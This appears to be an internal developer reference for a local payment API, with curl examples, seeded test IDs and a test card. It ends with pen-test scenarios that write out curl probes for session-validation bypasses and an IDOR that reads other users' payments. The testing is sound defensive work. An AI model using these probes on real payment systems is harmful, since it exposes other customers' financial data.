# Payment API — Local Test Data & curl Examples

Base URL: `http://localhost:8080`

## Test IDs

| Field | Value |
|-------|-------|
| Root merchant ID | `000e8400-e29b-41d4-a716-446655440000` |
| Seeded payment merchant ID | `660e8400-e29b-41d4-a716-446655440007` |
| Seeded payment ID | `c0fa8ce6-8881-47cc-9d17-853eb2a03369` |
| Seeded payment user ID | `demo-user-24` |
| Session ID (any string) | `sess_abc123` |

---

## GET /payment-types

Returns available payment types for a merchant.

**Required params:** `merchantId`, `method`, `userId`, `sessionId`

```bash
# payin
curl "http://localhost:8080/payment-types?merchantId=000e8400-e29b-41d4-a716-446655440000&method=payin&userId=user123&sessionId=sess_abc123"

# payout
curl "http://localhost:8080/payment-types?merchantId=000e8400-e29b-41d4-a716-446655440000&method=payout&userId=user123&sessionId=sess_abc123"
```

**payin** returns: `card`, `bank`, `redirect` (mifinity, googlepay, applepay, giropay, ideal, trumo), `skrill`, `voucher` (flexepin)

**payout** returns: `card`, `bank`, `mifinity`, `skrill`

---

## GET /payment/status/{paymentId}

Returns the current status of a payment.

**Required params:** `merchantId`, `userId`, `sessionId`

```bash
curl "http://localhost:8080/payment/status/c0fa8ce6-8881-47cc-9d17-853eb2a03369?merchantId=660e8400-e29b-41d4-a716-446655440007&userId=demo-user-24&sessionId=sess_abc123"
```

**Response:**
```json
{"paymentId":"c0fa8ce6-8881-47cc-9d17-853eb2a03369","status":"done"}
```

---

## GET /payment/summary/{paymentId}

Returns a display summary of a completed payment.

**Required params:** `merchantId`

```bash
curl "http://localhost:8080/payment/summary/c0fa8ce6-8881-47cc-9d17-853eb2a03369?merchantId=660e8400-e29b-41d4-a716-446655440007"
```

**Response:**
```json
{
  "fields": [
    {"id": "amount", "value": {"currency": "USD", "value": "9999.00"}},
    {"id": "paymentType", "value": "bank"},
    {"id": "method", "value": "payin"},
    {"id": "merchantPaymentId", "value": "MERCH-c0fa8ce6-1775640756"}
  ],
  "messages": ["payment.summary.successful"],
  "paymentStatus": "successful"
}
```

---

## GET /i18n

Returns localised UI strings for a merchant.

**Required params:** `merchantId`, `locale`

```bash
curl "http://localhost:8080/i18n?merchantId=000e8400-e29b-41d4-a716-446655440000&locale=en"
```

Returns a `texts` object with all UI label keys.

---

## POST /payment/{paymentType}/{method}

Initiates a payment. **Requires a PCI transaction token** — card data must be encrypted via the tokenisation service first. Not directly testable without the PCI stack.

```bash
curl -X POST "http://localhost:8080/payment/card/payin" \
  -H "Content-Type: application/json" \
  -d '{
    "merchantId": "000e8400-e29b-41d4-a716-446655440000",
    "sessionId": "sess_abc123",
    "userId": "user123",
    "amount": "100",
    "currency": "EUR",
    "input": {
      "transactionToken": "<token-from-pci-tokenisation>",
      "expiryDate": "1229",
      "holderName": "Test User",
      "saveAccount": "false"
    }
  }'
```

**Test card:** PAN `4111111111111111`, CSC `123`, expiry `1229`

---

## Finding More Payment IDs

Use the Management API to list seeded payments:

```bash
curl -H "Authorization: Bearer demo-key-1" "http://localhost:8081/payments?limit=20" | jq '.payments[].id'
```

To find the `merchantId` and `userId` for a specific payment:

```bash
curl -H "Authorization: Bearer demo-key-1" "http://localhost:8081/payments/<paymentId>" | jq '{merchantId: .payment.merchantId, userId: .payment.userId}'
```

---

## Pen Test Scenarios

### 1. Invalid sessionId accepted (no integration URL)

Both endpoints return `200` with any `sessionId` on demo merchants because `IntegrationConfig.BaseUrl` is not set.

```bash
# Completely invalid sessionId — still returns 200
curl "http://localhost:8080/payment-types?merchantId=000e8400-e29b-41d4-a716-446655440000&method=payin&userId=user123&sessionId=INVALID"

curl "http://localhost:8080/payment/status/c0fa8ce6-8881-47cc-9d17-853eb2a03369?merchantId=660e8400-e29b-41d4-a716-446655440007&userId=demo-user-24&sessionId=INVALID"
```

**Expected (prod):** `401 Unauthorized`
**Actual (local):** `200 OK`

---

### 2. Empty sessionId bypass on `/payment-types`

An empty `sessionId` skips validation even when an integration URL is present due to an extra guard at `payment_api.go:222`.

```bash
curl "http://localhost:8080/payment-types?merchantId=000e8400-e29b-41d4-a716-446655440000&method=payin&userId=user123&sessionId="
```

**Expected (prod):** `401 Unauthorized`
**Actual (local):** `200 OK`

---

### 3. IDOR — poll another user's payment

Payment `fcc2c611` belongs to `demo-user-24`. Payment `00aa3dac` belongs to `demo-user-23`. Both are under merchant `660e8400-e29b-41d4-a716-446655440007`.

Use `demo-user-24`'s session to poll `demo-user-23`'s payment:

```bash
# Legitimate — demo-user-24 polling their own payment
curl "http://localhost:8080/payment/status/fcc2c611-6cd7-4a62-b7b5-72b5b042bbfd?merchantId=660e8400-e29b-41d4-a716-446655440007&userId=demo-user-24&sessionId=sess_abc123"

# IDOR probe — demo-user-24 polling demo-user-23's payment
curl "http://localhost:8080/payment/status/00aa3dac-7ab4-4faa-80af-2d4489e4f9a4?merchantId=660e8400-e29b-41d4-a716-446655440007&userId=demo-user-24&sessionId=sess_abc123"

# IDOR probe — summary endpoint (no userId required at all)
curl "http://localhost:8080/payment/summary/00aa3dac-7ab4-4faa-80af-2d4489e4f9a4?merchantId=660e8400-e29b-41d4-a716-446655440007"
```

**Expected:** `403 Forbidden` or `404 Not Found` for cross-user access
**Actual:** `200 OK` — payment data returned regardless of `userId`

---

### Seeded payments for cross-user IDOR testing

| Payment ID | Merchant ID | Owner userId | Status |
|------------|-------------|--------------|--------|
| `c0fa8ce6-8881-47cc-9d17-853eb2a03369` | `660e8400-e29b-41d4-a716-446655440007` | `demo-user-24` | successful |
| `fcc2c611-6cd7-4a62-b7b5-72b5b042bbfd` | `660e8400-e29b-41d4-a716-446655440007` | `demo-user-24` | awaiting_capture |
| `00aa3dac-7ab4-4faa-80af-2d4489e4f9a4` | `660e8400-e29b-41d4-a716-446655440007` | `demo-user-23` | awaiting_capture |
| `6937daf1-fa58-4281-8db0-44451907d276` | `660e8400-e29b-41d4-a716-446655440007` | `demo-user-22` | awaiting_capture |